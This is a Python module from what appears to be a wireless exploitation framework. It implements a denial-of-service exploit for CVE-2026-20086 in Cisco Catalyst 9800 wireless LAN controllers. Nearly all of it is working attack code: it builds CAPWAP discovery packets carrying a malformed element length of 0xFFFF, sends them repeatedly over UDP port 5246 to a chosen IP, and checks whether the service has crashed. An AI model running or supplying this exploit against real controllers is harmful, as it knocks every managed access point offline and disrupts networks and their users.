# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cisco Catalyst CW9800 CAPWAP Malformed Packet DoS (CVE-2026-20086).

    The Cisco Catalyst 9800 series Wireless LAN Controller contains a
    vulnerability in the CAPWAP (Control And Provisioning of Wireless
    Access Points) protocol handler.  When the controller receives a
    specially crafted CAPWAP control message with an invalid message
    element length, the CAPWAP process crashes and restarts, causing a
    denial of service condition for all managed access points.

    The CAPWAP protocol operates on UDP ports 5246 (control) and 5247
    (data).  The malformed packet triggers an unhandled exception in the
    message element parser when the declared length exceeds the remaining
    packet buffer.

    CVSS v3.1: 7.5 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cisco Catalyst CW9800 CAPWAP Malformed Packet DoS (CVE-2026-20086)",
        "description": (
            "Exploits CVE-2026-20086 in Cisco Catalyst 9800 series WLCs. "
            "A specially crafted CAPWAP control message with an invalid "
            "message element length triggers an unhandled exception in the "
            "CAPWAP process, causing it to crash and restart.  All managed "
            "access points lose connectivity during the restart."
        ),
        "authors": (
            "Cisco PSIRT (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20086",
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/",
            "https://www.rfc-editor.org/rfc/rfc5415",
        ),
        "disclosure_date": "2026-07-15",
        "platform": "cisco_ios_xe",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Cisco Catalyst 9800-CL Wireless Controller",
            "Cisco Catalyst 9800-40 Wireless Controller",
            "Cisco Catalyst 9800-80 Wireless Controller",
            "Cisco Catalyst 9800-L Wireless Controller",
        ),
    }

    target = OptIP("", "Target WLC management IP address")
    port = OptPort(5246, "CAPWAP control port (default 5246)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    repeat_count = OptInteger(10, "Number of malformed packets to send")
    inter_packet_delay = OptFloat(0.1, "Delay between packets in seconds")

    # CAPWAP protocol constants (RFC 5415)
    _CAPWAP_VERSION = 0
    _CAPWAP_TYPE_CONTROL = 0
    _CAPWAP_PREAMBLE = 0x00

    # CAPWAP message types
    _MSG_DISCOVERY_REQUEST = 1
    _MSG_JOIN_REQUEST = 3
    _MSG_ECHO_REQUEST = 13

    # Message element types
    _ELEM_AC_DESCRIPTOR = 1
    _ELEM_VENDOR_SPECIFIC = 37

    def _build_capwap_header(self, payload_len: int) -> bytes:
        """Build a CAPWAP preamble + header.

        CAPWAP header format (RFC 5415, Section 4.3):
        - Preamble: version(4 bits) + type(4 bits) = 1 byte
        - Header: HLEN(5) + RID(5) + WBID(5) + T(1) + F(1) + L(1)
                  + W(1) + M(1) + K(1) + Flags(3) = 3 bytes
        - Fragment ID (16 bits), Fragment offset (13 bits), reserved (3 bits)
        """
        preamble = ((self._CAPWAP_VERSION & 0x0F) << 4) | (self._CAPWAP_PREAMBLE & 0x0F)
        hlen = 2
        rid = 0
        wbid = 1
        word1 = ((hlen & 0x1F) << 27) | ((rid & 0x1F) << 22) | ((wbid & 0x1F) << 17)
        frag_id = 0
        frag_offset = 0

        header = struct.pack("B", preamble)
        header += struct.pack(">I", word1)[:3]
        header += struct.pack(">HH", frag_id, frag_offset << 3)

        return header

    def _build_message_element(self, elem_type: int, data: bytes) -> bytes:
        """Build a CAPWAP message element (type + length + value)."""
        return struct.pack(">HH", elem_type, len(data)) + data

    def _build_malformed_element(self) -> bytes:
        """Build a malformed message element that triggers the crash.

        The vulnerability is in the length parsing: we declare a length
        that exceeds the remaining packet size, causing an out-of-bounds
        read in the element parser.
        """
        elem_type = self._ELEM_VENDOR_SPECIFIC
        fake_length = 0xFFFF
        data = b"\x41" * 64
        return struct.pack(">HH", elem_type, fake_length) + data

    def _build_discovery_request(self, malformed: bool = False) -> bytes:
        """Build a CAPWAP Discovery Request message."""
        # Control message header: msg_type(32) + seq_num(8) + msg_elem_len(16) + flags(8)
        seq_num = 0
        flags = 0

        elements = b""
        # Normal AC Descriptor element
        ac_data = struct.pack(">HHBBH", 0, 0, 12, 0, 0) + b"WirelessXPL"
        elements += self._build_message_element(self._ELEM_AC_DESCRIPTOR, ac_data)

        if malformed:
            elements += self._build_malformed_element()

        msg_elem_len = len(elements)
        ctrl_header = struct.pack(
            ">IBHB",
            self._MSG_DISCOVERY_REQUEST,
            seq_num,
            msg_elem_len,
            flags,
        )

        payload = ctrl_header + elements
        capwap_header = self._build_capwap_header(len(payload))
        return capwap_header + payload

    def _send_udp(self, data: bytes) -> tuple[bool, bytes]:
        """Send a UDP packet to the CAPWAP control port."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(data, (str(self.target), int(self.port)))
            try:
                resp, _ = sock.recvfrom(4096)
                return True, resp
            except (TimeoutError, OSError):
                return True, b""
            finally:
                sock.close()
        except OSError:
            return False, b""

    @mute
    def check(self) -> bool:
        """Send a normal CAPWAP Discovery Request to verify the target."""
        pkt = self._build_discovery_request(malformed=False)
        sent, resp = self._send_udp(pkt)
        return sent

    def run(self) -> None:
        if not self.target:
            print_error("target is required (WLC management IP)")
            return

        if not self.check():
            print_error(
                f"Cannot reach {self.target}:{self.port} via UDP. "
                "Verify the WLC is reachable and CAPWAP control port is open."
            )
            return

        print_success("CAPWAP control port is reachable; sending malformed packets")
        self._exploit()

    def _exploit(self) -> None:
        normal_pkt = self._build_discovery_request(malformed=False)
        malformed_pkt = self._build_discovery_request(malformed=True)

        print_status("Phase 1: Sending normal Discovery Request to prime the session")
        self._send_udp(normal_pkt)
        time.sleep(0.2)

        print_status(
            f"Phase 2: Sending {self.repeat_count} malformed CAPWAP packets "
            f"(element length 0xFFFF overflow)"
        )
        sent_count = 0
        for i in range(self.repeat_count):
            ok, _ = self._send_udp(malformed_pkt)
            if ok:
                sent_count += 1
            if self.inter_packet_delay > 0:
                time.sleep(self.inter_packet_delay)

        print_status(f"Sent {sent_count}/{self.repeat_count} malformed packets")

        print_status("Phase 3: Verifying CAPWAP service status")
        time.sleep(1.0)
        pkt = self._build_discovery_request(malformed=False)
        ok, resp = self._send_udp(pkt)

        if ok and not resp:
            print_success(
                "CAPWAP service is no longer responding. The malformed "
                "message element likely crashed the CAPWAP process. "
                "Managed APs will reconnect after the service restarts."
            )
        elif ok and resp:
            print_info(
                "CAPWAP service still responding; the target may have "
                "been patched or the crash requires additional packets."
            )
        else:
            print_error("Cannot reach target; network issue or full crash.")
